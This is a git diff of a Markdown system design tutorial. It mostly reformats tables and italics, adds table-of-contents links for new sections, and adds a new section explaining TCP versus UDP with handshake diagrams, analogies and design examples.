@@ -1,6 +1,6 @@
 ﻿# ðŸ—ï¸ System Design â€” From Zero to Planet Scale
 
-> *"System design is just common sense at scale. The hard part is that common sense stops being obvious when millions of things happen at once."*
+> _"System design is just common sense at scale. The hard part is that common sense stops being obvious when millions of things happen at once."_
 
 ---
 
@@ -46,6 +46,12 @@ But the moment real people start using your thing, everything breaks in ways you
 20. [Single Server Setup â€” where every system starts](#20-single-server-setup--where-every-system-starts)
 21. [API Design â€” the contract between systems](#21-api-design--the-contract-between-systems)
 22. [API Protocols â€” the languages systems use to talk](#22-api-protocols--the-languages-systems-use-to-talk)
+23. [Transport Layer â€” TCP and UDP](#23-transport-layer--tcp-and-udp)
+24. [RESTful APIs â€” the most popular way to build APIs](#24-restful-apis--the-most-popular-way-to-build-apis)
+25. [GraphQL â€” fetch exactly what you need](#25-graphql--fetch-exactly-what-you-need)
+26. [Authentication â€” proving who you are](#26-authentication--proving-who-you-are)
+27. [Authorization â€” what you're allowed to do](#27-authorization--what-youre-allowed-to-do)
+28. [Security â€” keeping the bad guys out](#28-security--keeping-the-bad-guys-out)
 
 ---
 
@@ -188,19 +194,19 @@ graph TD
 
 ### What each block does â€” with real analogies
 
-| Block | What it does | Real-world analogy |
-|---|---|---|
-| **DNS** | Converts `facebook.com` into `157.240.22.35` so computers can find each other | Phone book â€” you look up "Alice" to get her number |
-| **CDN** | Keeps copies of images, videos, CSS in servers physically close to users | A newspaper printing facility in every city â€” you don't ship all papers from one place |
-| **Load Balancer** | Sits in front of your servers and divides incoming traffic across them | Airport check-in desk â€” "Counter 3 is free, please go there" |
-| **API Gateway** | Single entry point for all traffic â€” checks auth, routes to the right service | Hotel reception â€” one desk handles room keys, complaints, and directions |
-| **App Server** | Runs your actual business logic â€” processes requests, makes decisions | A chef in the kitchen who processes an order |
-| **Cache** | Fast in-memory store (RAM) for frequently accessed data | Post-it notes on your desk â€” faster than going to the filing cabinet |
-| **Primary DB** | The permanent home of all your data. Handles reads AND writes | The actual filing cabinet â€” source of truth |
-| **Replica DB** | A copy of the primary DB that handles read queries only | A photocopy of important documents for reference |
-| **Message Queue** | Holds tasks that need to be done, workers pick them up at their own pace | A restaurant ticket printer â€” orders pile up, chefs process them one by one |
-| **Worker** | A background process that eats from the queue | The line cook who handles tickets |
-| **Object Storage** | Cheap, scalable storage for large files (images, videos, backups) | A warehouse â€” not fast, but holds everything |
+| Block              | What it does                                                                  | Real-world analogy                                                                     |
+| ------------------ | ----------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
+| **DNS**            | Converts `facebook.com` into `157.240.22.35` so computers can find each other | Phone book â€” you look up "Alice" to get her number                                     |
+| **CDN**            | Keeps copies of images, videos, CSS in servers physically close to users      | A newspaper printing facility in every city â€” you don't ship all papers from one place |
+| **Load Balancer**  | Sits in front of your servers and divides incoming traffic across them        | Airport check-in desk â€” "Counter 3 is free, please go there"                           |
+| **API Gateway**    | Single entry point for all traffic â€” checks auth, routes to the right service | Hotel reception â€” one desk handles room keys, complaints, and directions               |
+| **App Server**     | Runs your actual business logic â€” processes requests, makes decisions         | A chef in the kitchen who processes an order                                           |
+| **Cache**          | Fast in-memory store (RAM) for frequently accessed data                       | Post-it notes on your desk â€” faster than going to the filing cabinet                   |
+| **Primary DB**     | The permanent home of all your data. Handles reads AND writes                 | The actual filing cabinet â€” source of truth                                            |
+| **Replica DB**     | A copy of the primary DB that handles read queries only                       | A photocopy of important documents for reference                                       |
+| **Message Queue**  | Holds tasks that need to be done, workers pick them up at their own pace      | A restaurant ticket printer â€” orders pile up, chefs process them one by one            |
+| **Worker**         | A background process that eats from the queue                                 | The line cook who handles tickets                                                      |
+| **Object Storage** | Cheap, scalable storage for large files (images, videos, backups)             | A warehouse â€” not fast, but holds everything                                           |
 
 ---
 
@@ -229,11 +235,13 @@ You have one server. It's getting slow. So you buy a bigger, more powerful serve
 ```
 
 **When is this the right call?**
+
 - You're just getting started and want simplicity
 - Your problem is a single slow database query that needs more RAM
 - You need a quick fix before a product launch
 
 **When does it stop working?**
+
 - There's a physical ceiling â€” you can't buy a server with unlimited RAM
 - It's expensive disproportionately â€” doubling RAM doesn't just cost double
 - It's a **single point of failure** â€” if this one giant machine dies, everything is down
@@ -263,6 +271,7 @@ Instead of making one machine bigger, you add more identical machines and split 
 ```
 
 **Why this is better at scale:**
+
 - No ceiling â€” just keep adding machines
 - One server dying doesn't kill the app â€” others pick up the slack
 - Cheap commodity hardware instead of expensive specialised servers
@@ -320,14 +329,14 @@ It sounds simple, but getting from "pretty reliable" to "almost never down" is o
 
 ### The nines â€” what they actually mean
 
-| Availability | Downtime per year | Downtime per month | What it means in practice |
-|---|---|---|---|
-| 90% | 36.5 days | ~3 days | Awful. Users will leave. |
-| 99% | 3.65 days | ~7 hours | Acceptable for hobby projects |
-| 99.9% | 8.7 hours | ~44 minutes | "Three nines" â€” industry standard for good services |
-| 99.99% | 52 minutes | ~4 minutes | "Four nines" â€” what serious production services aim for |
-| 99.999% | 5 minutes | ~26 seconds | "Five nines" â€” telephone networks, banking |
-| 99.9999% | 30 seconds | ~3 seconds | Practically unachievable at reasonable cost |
+| Availability | Downtime per year | Downtime per month | What it means in practice                               |
+| ------------ | ----------------- | ------------------ | ------------------------------------------------------- |
+| 90%          | 36.5 days         | ~3 days            | Awful. Users will leave.                                |
+| 99%          | 3.65 days         | ~7 hours           | Acceptable for hobby projects                           |
+| 99.9%        | 8.7 hours         | ~44 minutes        | "Three nines" â€” industry standard for good services     |
+| 99.99%       | 52 minutes        | ~4 minutes         | "Four nines" â€” what serious production services aim for |
+| 99.999%      | 5 minutes         | ~26 seconds        | "Five nines" â€” telephone networks, banking              |
+| 99.9999%     | 30 seconds        | ~3 seconds         | Practically unachievable at reasonable cost             |
 
 > **52 minutes of downtime per year** sounds like a lot, but achieving "four nines" (99.99%) requires extremely careful engineering. AWS targets this. Most companies settle for 99.9%.
 
@@ -386,7 +395,7 @@ graph TD
 
 ### Graceful Degradation â€” fail smart, not hard
 
-The best systems don't crash completely when something breaks. They degrade gracefully â€” they limp along, serving *some* functionality.
+The best systems don't crash completely when something breaks. They degrade gracefully â€” they limp along, serving _some_ functionality.
 
 ```
 âŒ Not graceful:
@@ -413,7 +422,7 @@ This is one of the most famous ideas in all of distributed systems, and it's sur
 
 **C â€” Consistency:** Every read gets the most recent write. If you just updated your profile picture, and your friend loads your profile right now, they see the new one. Not the old one. Always.
 
-**A â€” Availability:** The system always responds. Maybe the data is slightly old, but it never just says "I'm busy" or "I'm down". It always gives you *something*.
+**A â€” Availability:** The system always responds. Maybe the data is slightly old, but it never just says "I'm busy" or "I'm down". It always gives you _something_.
 
 **P â€” Partition Tolerance:** The system keeps working even if the network between some of its machines breaks (a "partition" = a communication split between nodes).
 
@@ -517,7 +526,7 @@ SQL databases store data in **tables** (like spreadsheets), with **rows** (recor
 â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 ```
 
-You can run a query like: *"Give me all orders over Â£50 for users who signed up before 2024"* â€” joining the two tables together. This is the superpower of SQL.
+You can run a query like: _"Give me all orders over Â£50 for users who signed up before 2024"_ â€” joining the two tables together. This is the superpower of SQL.
 
 **The ACID guarantee â€” what makes SQL trustworthy:**
 
@@ -595,15 +604,15 @@ No joins needed â€” everything about Alice is in one document. Great for re
 
 ### ACID (SQL) vs BASE (NoSQL) â€” the philosophy difference
 
-| | **ACID** (SQL) | **BASE** (NoSQL) |
-|---|---|---|
-| **Priority** | Correctness above all else | Availability above all else |
-| **A / BA** | **A**tomic â€” all or nothing | **B**asically **A**vailable â€” always responds |
-| **C / S** | **C**onsistent â€” rules always apply | **S**oft state â€” might be temporarily inconsistent |
-| **I / E** | **I**solated â€” transactions don't interfere | **E**ventually consistent â€” will be correct... eventually |
-| **D** | **D**urable â€” survives crashes | Depends on config |
-| **Analogy** | A super strict accountant who checks every number twice | A fast cashier who sometimes needs to reconcile the till at end of day |
-| **Use for** | Money, reservations, medical data | Likes, views, caches, feeds |
+|              | **ACID** (SQL)                                          | **BASE** (NoSQL)                                                       |
+| ------------ | ------------------------------------------------------- | ---------------------------------------------------------------------- |
+| **Priority** | Correctness above all else                              | Availability above all else                                            |
+| **A / BA**   | **A**tomic â€” all or nothing                             | **B**asically **A**vailable â€” always responds                          |
+| **C / S**    | **C**onsistent â€” rules always apply                     | **S**oft state â€” might be temporarily inconsistent                     |
+| **I / E**    | **I**solated â€” transactions don't interfere             | **E**ventually consistent â€” will be correct... eventually              |
+| **D**        | **D**urable â€” survives crashes                          | Depends on config                                                      |
+| **Analogy**  | A super strict accountant who checks every number twice | A fast cashier who sometimes needs to reconcile the till at end of day |
+| **Use for**  | Money, reservations, medical data                       | Likes, views, caches, feeds                                            |
 
 ---
 
@@ -613,7 +622,7 @@ No joins needed â€” everything about Alice is in one document. Great for re
 
 Every time a user loads your app's homepage, you might be running 10 database queries to build that page. If 100,000 people load the homepage per minute, that's 1,000,000 database queries per minute â€” for the same data.
 
-The cache says: *"I already fetched this. Here's my saved copy. No need to bother the database."*
+The cache says: _"I already fetched this. Here's my saved copy. No need to bother the database."_
 
 ```
 WITHOUT CACHE:                           WITH CACHE:
@@ -699,7 +708,7 @@ Good for: Any data that changes on a predictable schedule.
 
 ### Cache invalidation â€” the hardest problem
 
-> *"There are only two hard things in Computer Science: cache invalidation and naming things."* â€” Phil Karlton
+> _"There are only two hard things in Computer Science: cache invalidation and naming things."_ â€” Phil Karlton
 
 You cached Alice's profile. Alice then updates her profile picture. Now the cache has the old picture and the database has the new one. They're out of sync. How do you fix this?
 
@@ -821,7 +830,7 @@ flowchart TD
 
 ### Health checks â€” how the load balancer knows a server is dead
 
-Every few seconds, the load balancer pings each server: *"Are you alive?"*
+Every few seconds, the load balancer pings each server: _"Are you alive?"_
 
 ```
 Every 5 seconds:
@@ -1034,7 +1043,7 @@ This is where queues are genuinely clever. Most queues use **acknowledgement (AC
 1. Worker picks up "send email" job
 2. Worker starts processing it
 3. Server crashes mid-way â€” email never sent
-4. Queue notices: "I gave this job 30 seconds ago and got no ACK. 
+4. Queue notices: "I gave this job 30 seconds ago and got no ACK.
    Putting it back in the queue."
 5. Another worker picks it up and completes it âœ…
 
@@ -1062,13 +1071,13 @@ Operations team can inspect DLQ:
 
 ### Kafka vs RabbitMQ vs SQS
 
-| | Kafka | RabbitMQ | AWS SQS |
-|---|---|---|---|
+|                  | Kafka                                                                                                 | RabbitMQ                                                            | AWS SQS                             |
+| ---------------- | ----------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ----------------------------------- |
 | **Mental model** | Append-only log. Messages are retained for days/weeks. Multiple consumers can read the same messages. | Traditional queue. Message is deleted once a consumer processes it. | Managed queue. Fully hosted by AWS. |
-| **Speed** | Millions of msg/sec | Hundreds of thousands/sec | Moderate, but managed |
-| **Replay** | âœ… Yes â€” rewind to any point | âŒ No â€” gone once consumed | âŒ No (standard queue) |
-| **Use for** | Event streaming, audit logs, activity feeds | Task queues, async jobs | AWS-native async processing |
-| **Analogy** | A newspaper archive â€” every edition ever printed, you can go back and re-read any of them | A sticky note â€” once acted on, you throw it away | A managed sticky note service |
+| **Speed**        | Millions of msg/sec                                                                                   | Hundreds of thousands/sec                                           | Moderate, but managed               |
+| **Replay**       | âœ… Yes â€” rewind to any point                                                                          | âŒ No â€” gone once consumed                                          | âŒ No (standard queue)              |
+| **Use for**      | Event streaming, audit logs, activity feeds                                                           | Task queues, async jobs                                             | AWS-native async processing         |
+| **Analogy**      | A newspaper archive â€” every edition ever printed, you can go back and re-read any of them             | A sticky note â€” once acted on, you throw it away                    | A managed sticky note service       |
 
 ---
 
@@ -1216,6 +1225,7 @@ Bad for bursty-but-legitimate traffic.
 Most apps never need sharding. You need it only when your data grows so large that a single database machine can't hold it or query it fast enough.
 
 Signs you might need sharding:
+
 - Your database table has billions of rows and queries take seconds
 - A single DB server runs out of disk space
 - Write throughput exceeds what one machine can handle (~many thousands/sec)
@@ -1447,15 +1457,17 @@ A monolith is one codebase, deployed as one unit, talking to one database.
 ```
 
 **It's actually great when you're small:**
+
 - Easy to run locally â€” just one `npm start`
 - Easy to understand â€” everything is in one place
 - Easy to debug â€” no network calls between modules, just function calls
 - Works fine at small to medium scale
 
 **It falls apart when you grow:**
+
 - 50 engineers all changing one codebase â†’ constant merge conflicts
 - One module's bug can crash the entire app
-- "We need to scale the search feature" â†’ you have to scale the *entire* monolith
+- "We need to scale the search feature" â†’ you have to scale the _entire_ monolith
 - Deploy is all or nothing â€” a small fix requires deploying everything
 
 ---
@@ -1482,16 +1494,18 @@ graph TB
 ```
 
 **The benefits:**
+
 - Each service deploys independently â€” fix a bug in payments without touching search
 - Each service scales independently â€” payments getting slow? Scale only that
 - Teams own their service fully â€” no stepping on each other
 - Technology freedom â€” use the best tool for each job
 
 **The cost:**
-- Network calls between services add latency and failure risk  
-- A request might touch 5 services â€” debugging requires tracing across all 5  
-- Data consistency across services is hard (no single DB to ACID across)  
-- Much more infrastructure to manage (50 services = 50 CI/CD pipelines)  
+
+- Network calls between services add latency and failure risk
+- A request might touch 5 services â€” debugging requires tracing across all 5
+- Data consistency across services is hard (no single DB to ACID across)
+- Much more infrastructure to manage (50 services = 50 CI/CD pipelines)
 
 ---
 
@@ -1587,9 +1601,9 @@ What happens when you press Play on "Stranger Things":
 
 2. API Gateway â†’ Playback Service
    "Here is the manifest file: a list of video chunks at each quality"
-   
+
 3. Your Netflix app reads the manifest:
-   "There are 3000 chunks. Each 2 seconds of video. 
+   "There are 3000 chunks. Each 2 seconds of video.
     Available in 4K, 1080p, 720p, 480p."
 
 4. App checks your bandwidth: "You're getting 20 Mbps"
@@ -1666,7 +1680,7 @@ sequenceDiagram
 
 **How the geospatial search works:**
 
-The location service needs to answer *"who is within 2km of this point?"* millions of times per second. Standard databases are terrible at this. Uber uses a technique called **geohashing**:
+The location service needs to answer _"who is within 2km of this point?"_ millions of times per second. Standard databases are terrible at this. Uber uses a technique called **geohashing**:
 
 ```
 Geohash: divide the world into a grid
@@ -1708,7 +1722,7 @@ flowchart LR
 
 ### Step 1 â€” The questions you MUST ask before drawing anything
 
-*Never start designing without clarifying scope. Interviewers often leave requirements vague on purpose to see if you clarify.*
+_Never start designing without clarifying scope. Interviewers often leave requirements vague on purpose to see if you clarify._
 
 ```
 Scope:
@@ -1727,7 +1741,7 @@ Constraints:
 
 Consistency:
   "Is it okay to show slightly stale data?"
-  "Example: is it okay if a user sees their new profile pic 
+  "Example: is it okay if a user sees their new profile pic
    with 5 seconds delay, or must it be instant?"
 ```
 
@@ -1809,20 +1823,20 @@ The Hard Problem:
 
 ### Quick problem â†’ solution reference
 
-| You hear this problem | Reach for this |
-|---|---|
-| "Server is overwhelmed" | Horizontal scaling + Load balancer |
-| "Database queries are slow" | Add Redis cache in front of it |
-| "Database can't hold all the data" | Sharding |
-| "One machine dying takes everything down" | Replication + failover, redundancy |
-| "Users in other countries have high latency" | CDN + edge servers / multi-region |
-| "Users wait too long for heavy operations" | Message queue + async workers |
-| "Same data fetched millions of times" | Cache it (browser, CDN, or Redis) |
-| "Managing 50 services is chaos" | API Gateway + service mesh |
-| "One client is abusing the API" | Rate limiting |
-| "Debugging across services is impossible" | Distributed tracing (Jaeger, Zipkin) |
-| "Need to see what's happening in real time" | Centralised logging (ELK stack) |
-| "Write throughput maxed out" | CQRS + event sourcing, or sharding |
+| You hear this problem                        | Reach for this                       |
+| -------------------------------------------- | ------------------------------------ |
+| "Server is overwhelmed"                      | Horizontal scaling + Load balancer   |
+| "Database queries are slow"                  | Add Redis cache in front of it       |
+| "Database can't hold all the data"           | Sharding                             |
+| "One machine dying takes everything down"    | Replication + failover, redundancy   |
+| "Users in other countries have high latency" | CDN + edge servers / multi-region    |
+| "Users wait too long for heavy operations"   | Message queue + async workers        |
+| "Same data fetched millions of times"        | Cache it (browser, CDN, or Redis)    |
+| "Managing 50 services is chaos"              | API Gateway + service mesh           |
+| "One client is abusing the API"              | Rate limiting                        |
+| "Debugging across services is impossible"    | Distributed tracing (Jaeger, Zipkin) |
+| "Need to see what's happening in real time"  | Centralised logging (ELK stack)      |
+| "Write throughput maxed out"                 | CQRS + event sourcing, or sharding   |
 
 ---
 
@@ -1862,16 +1876,16 @@ Cross-continent network = nightmare
 â†’ CDN = serve from nearby instead of cross-continent
 ```
 
-| What | Approximate |
-|---|---|
-| Read 1MB from RAM | 0.25 ms |
-| Read 1MB from SSD | 1 ms |
-| Read 1MB from HDD | 20 ms |
-| Redis GET operation | < 1 ms |
-| DB query (cached plan, indexed) | 1-5 ms |
-| DB query (cold, full scan) | 100-5000 ms |
-| HTTP req (same city CDN) | 10-30 ms |
-| HTTP req (cross-continent) | 150-300 ms |
+| What                            | Approximate |
+| ------------------------------- | ----------- |
+| Read 1MB from RAM               | 0.25 ms     |
+| Read 1MB from SSD               | 1 ms        |
+| Read 1MB from HDD               | 20 ms       |
+| Redis GET operation             | < 1 ms      |
+| DB query (cached plan, indexed) | 1-5 ms      |
+| DB query (cold, full scan)      | 100-5000 ms |
+| HTTP req (same city CDN)        | 10-30 ms    |
+| HTTP req (cross-continent)      | 150-300 ms  |
 
 ---
 
@@ -1879,48 +1893,48 @@ Cross-continent network = nightmare
 
 A plain-English definition of every term used in system design:
 
-| Term | What it actually means |
-|---|---|
-| **Latency** | How long one request takes from start to finish. "High latency" = slow. |
-| **Throughput** | How many requests your system handles per second. "High throughput" = handles lots. |
-| **Scalability** | Can your system handle 10x more load by adding resources? |
-| **Availability** | Is your system up and responding? Measured as a % of time. |
-| **Reliability** | Does your system do what it's supposed to do, consistently? |
-| **Durability** | If you save data, does it stay saved even after crashes? |
-| **Consistency** | Do all nodes/users see the same data at the same time? |
-| **Eventual consistency** | Data will be consistent across all nodes... but maybe not immediately. |
-| **Redundancy** | Having backup components so one failure doesn't kill everything. |
-| **Failover** | Automatic switch from a failed component to its backup. |
-| **SPOF** | Single Point of Failure â€” one thing whose death kills the whole system. |
-| **Stateless** | Server has no memory of previous requests. Each request contains everything needed. |
-| **Idempotent** | Doing the same operation multiple times gives same result. Safe to retry. |
-| **Horizontal scaling** | Add more machines (scale out). |
-| **Vertical scaling** | Make existing machine bigger (scale up). |
-| **Sharding** | Split data across multiple DB machines. Each holds a different slice. |
-| **Replication** | Copy the SAME data to multiple machines. Different shards. |
-| **Cache hit** | Requested data found in cache. Fast. |
-| **Cache miss** | Requested data NOT in cache. Had to go to DB. Slow. |
-| **Cache invalidation** | Deciding when to delete or update cached data because the source changed. |
-| **TTL** | Time To Live â€” how long something is valid before expiring. |
-| **Fan-out** | One event causing writes to many places (e.g. one tweet â†’ many timelines). |
-| **Hot spot** | One shard/server getting way more traffic than others. |
-| **Rate limiting** | Capping how many requests a client can make in a time window. |
-| **Backpressure** | Signal from an overwhelmed component to its upstream to slow down. |
-| **SLA** | Service Level Agreement â€” the uptime % you promise customers. |
-| **SLO** | Service Level Objective â€” internal target for uptime/performance. |
-| **P99 latency** | 99th percentile latency â€” "99% of requests complete within this time". |
-| **CDN** | Content Delivery Network â€” global servers that cache your static content closer to users. |
-| **Edge server** | A server physically close to the end user. CDN nodes are edge servers. |
-| **Origin server** | Your main server. CDNs fetch from origin when they don't have a cached copy. |
-| **Partition** | A network split between nodes that can't communicate with each other. |
-| **Consensus** | Multiple distributed nodes agreeing on one value (very hard problem). |
-| **Leader election** | Choosing one node to be the "primary" / "leader" in a cluster. |
-| **Circuit breaker** | Stops calling a failing service and fails fast instead of waiting. Prevents cascade failures. |
-| **Saga pattern** | A way to handle distributed transactions across microservices without a global lock. |
-| **CQRS** | Command Query Responsibility Segregation â€” separate reads and writes into different models. |
-| **Event sourcing** | Store all changes as events rather than just the current state. |
-| **Bloom filter** | Probabilistic data structure: "Is this item definitely NOT in the set?" Used for cache pre-checks. |
-| **Consistent hashing** | A way to distribute load across servers so adding/removing servers only affects a small % of data. |
+| Term                     | What it actually means                                                                             |
+| ------------------------ | -------------------------------------------------------------------------------------------------- |
+| **Latency**              | How long one request takes from start to finish. "High latency" = slow.                            |
+| **Throughput**           | How many requests your system handles per second. "High throughput" = handles lots.                |
+| **Scalability**          | Can your system handle 10x more load by adding resources?                                          |
+| **Availability**         | Is your system up and responding? Measured as a % of time.                                         |
+| **Reliability**          | Does your system do what it's supposed to do, consistently?                                        |
+| **Durability**           | If you save data, does it stay saved even after crashes?                                           |
+| **Consistency**          | Do all nodes/users see the same data at the same time?                                             |
+| **Eventual consistency** | Data will be consistent across all nodes... but maybe not immediately.                             |
+| **Redundancy**           | Having backup components so one failure doesn't kill everything.                                   |
+| **Failover**             | Automatic switch from a failed component to its backup.                                            |
+| **SPOF**                 | Single Point of Failure â€” one thing whose death kills the whole system.                            |
+| **Stateless**            | Server has no memory of previous requests. Each request contains everything needed.                |
+| **Idempotent**           | Doing the same operation multiple times gives same result. Safe to retry.                          |
+| **Horizontal scaling**   | Add more machines (scale out).                                                                     |
+| **Vertical scaling**     | Make existing machine bigger (scale up).                                                           |
+| **Sharding**             | Split data across multiple DB machines. Each holds a different slice.                              |
+| **Replication**          | Copy the SAME data to multiple machines. Different shards.                                         |
+| **Cache hit**            | Requested data found in cache. Fast.                                                               |
+| **Cache miss**           | Requested data NOT in cache. Had to go to DB. Slow.                                                |
+| **Cache invalidation**   | Deciding when to delete or update cached data because the source changed.                          |
+| **TTL**                  | Time To Live â€” how long something is valid before expiring.                                        |
+| **Fan-out**              | One event causing writes to many places (e.g. one tweet â†’ many timelines).                         |
+| **Hot spot**             | One shard/server getting way more traffic than others.                                             |
+| **Rate limiting**        | Capping how many requests a client can make in a time window.                                      |
+| **Backpressure**         | Signal from an overwhelmed component to its upstream to slow down.                                 |
+| **SLA**                  | Service Level Agreement â€” the uptime % you promise customers.                                      |
+| **SLO**                  | Service Level Objective â€” internal target for uptime/performance.                                  |
+| **P99 latency**          | 99th percentile latency â€” "99% of requests complete within this time".                             |
+| **CDN**                  | Content Delivery Network â€” global servers that cache your static content closer to users.          |
+| **Edge server**          | A server physically close to the end user. CDN nodes are edge servers.                             |
+| **Origin server**        | Your main server. CDNs fetch from origin when they don't have a cached copy.                       |
+| **Partition**            | A network split between nodes that can't communicate with each other.                              |
+| **Consensus**            | Multiple distributed nodes agreeing on one value (very hard problem).                              |
+| **Leader election**      | Choosing one node to be the "primary" / "leader" in a cluster.                                     |
+| **Circuit breaker**      | Stops calling a failing service and fails fast instead of waiting. Prevents cascade failures.      |
+| **Saga pattern**         | A way to handle distributed transactions across microservices without a global lock.               |
+| **CQRS**                 | Command Query Responsibility Segregation â€” separate reads and writes into different models.        |
+| **Event sourcing**       | Store all changes as events rather than just the current state.                                    |
+| **Bloom filter**         | Probabilistic data structure: "Is this item definitely NOT in the set?" Used for cache pre-checks. |
+| **Consistent hashing**   | A way to distribute load across servers so adding/removing servers only affects a small % of data. |
 
 ---
 
@@ -2293,6 +2307,946 @@ to ask "are you available?"          when they're free
 
 ---
 
+## 23. Transport Layer â€” TCP and UDP
+
+Before HTTP, REST, or GraphQL can work, there's a lower layer that actually moves bytes from one machine to another. This is the **Transport Layer**.
+
+The two main protocols here are **TCP** and **UDP**. They are like two very different delivery services.
+
+---
+
+### TCP â€” Transmission Control Protocol
+
+**TCP is the careful, reliable courier.** It makes sure every single piece of your message arrives, in order, with no duplicates.
+
+```
+How sending data over TCP works:
+
+STEP 1 â€” The Handshake (before any data is sent):
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚   You â†’ Server:  "SYN  â€” Hello, are you there?"             â”‚
+â”‚   Server â†’ You:  "SYN-ACK â€” Yes! Can you hear me too?"      â”‚
+â”‚   You â†’ Server:  "ACK  â€” Great. Let's start sending data."  â”‚
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+(This is called the "Three-Way Handshake")
+
+STEP 2 â€” Data travels in numbered packets:
+  Your message: "Hello World!"
+  Split into:   [Packet 1: "Hell"] [Packet 2: "o Wo"] [Packet 3: "rld!"]
+
+STEP 3 â€” Server acknowledges each packet:
+  Server: "Got 1 âœ…"  â†’  "Got 2 âœ…"  â†’  still waiting for 3...
+
+STEP 4 â€” Lost packets get resent:
+  Packet 3 never arrives â†’ TCP automatically resends it
+
+STEP 5 â€” Packets reassembled in correct order
+  Even if they arrived as 1, 3, 2 â†’ reassembled as 1, 2, 3
+```
+
+**TCP guarantees:**
+
+- âœ… All data arrives (no packet loss)
+- âœ… Data arrives in the correct order
+- âœ… No duplicate data
+- âŒ Slower because of all the handshaking and acknowledgements
+- âŒ More overhead per message
+
+**Used for:** HTTP/HTTPS, emails, SSH, file downloads, database connections â€” anything where **accuracy matters**.
+
+---
+
+### UDP â€” User Datagram Protocol
+
+**UDP is the careless, super-fast courier â€” fire and forget.**
+
+```
+How sending data over UDP works:
+
+No handshake.
+No acknowledgement.
+No ordering.
+No error recovery.
+
+You â†’ "Here's the data." â†’ [blasts packets at maximum speed]
+
+That's it. Done.
+```
+
+**UDP characteristics:**
+
+- âœ… Very fast â€” no overhead, no waiting
+- âœ… Low latency
+- âŒ No delivery guarantee (packets might silently get lost)
+- âŒ No ordering guarantee (might arrive out of order)
+- âŒ No automatic retransmission
+
+**Used for:** Video calls, online gaming, live streaming, DNS lookups, IoT sensors â€” anywhere **speed matters more than perfection**.
+
+---
+
+### The key difference â€” a concrete analogy
+
+```
+TCP is like sending a parcel with tracked, signed-for delivery:
+  âœ… You get confirmation it was delivered
+  âœ… If it gets lost, they redeliver
+  âœ… You know it arrived intact and unopened
+  âŒ Slightly slower and more expensive
+  Use when: the contents really matter (bank transfer, file download)
+
+UDP is like shoving a flyer through a letterbox:
+  âœ… Fast â€” no signing, no waiting
+  âŒ No confirmation it was received
+  âŒ Can't guarantee it didn't land in the bin
+  Use when: speed matters, losing 1 in 100 is acceptable (live video)
+```
+
+---
+
+### TCP vs UDP side by side
+
+```
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚             TCP                  â”‚             UDP                   â”‚
+â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
+â”‚ Connection-based                 â”‚ Connectionless                    â”‚
+â”‚ Three-way handshake required     â”‚ No handshake                      â”‚
+â”‚ Guaranteed delivery              â”‚ No delivery guarantee             â”‚
+â”‚ Guaranteed order                 â”‚ No order guarantee                â”‚
+â”‚ Error checking + recovery        â”‚ Basic error checking, no recovery â”‚
+â”‚ Slower                           â”‚ Faster                            â”‚
+â”‚ Higher overhead                  â”‚ Minimal overhead                  â”‚
+â”‚ HTTP, HTTPS, SSH, email, FTP     â”‚ Video calls, DNS, games, QUIC     â”‚
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+```
+
+---
+
+### When does this matter for system design?
+
+```
+Designing a video call app?
+  â†’ Dropping 1 frame out of 60 is fine. User barely notices.
+  â†’ Waiting for retransmission would cause freezing.
+  â†’ Use UDP. Speed > perfect delivery.
+
+Designing a payment system?
+  â†’ Missing one byte of a transaction = corruption or data loss.
+  â†’ Retry until it's confirmed.
+  â†’ Use TCP. Accuracy > speed.
+
+Designing a live multiplayer game?
+  â†’ Position updates every 50ms. Missing one is fine.
+  â†’ The NEXT update will correct any inaccuracy.
+  â†’ Use UDP for position. Use TCP for critical game events (kills, chat).
+
+Designing a DNS resolver?
+  â†’ Small request, small response, needs to be FAST.
+  â†’ If the UDP response gets lost, client just retries.
+  â†’ Use UDP.
+```
+
+> **Modern note:** HTTP/3 (the latest version of HTTP) runs over **QUIC**, which is built on UDP but adds its own reliability layer. It gets UDP's speed with some TCP-like guarantees, plus it avoids "head-of-line blocking" where a single lost packet stalls everything else.
+
+---
+
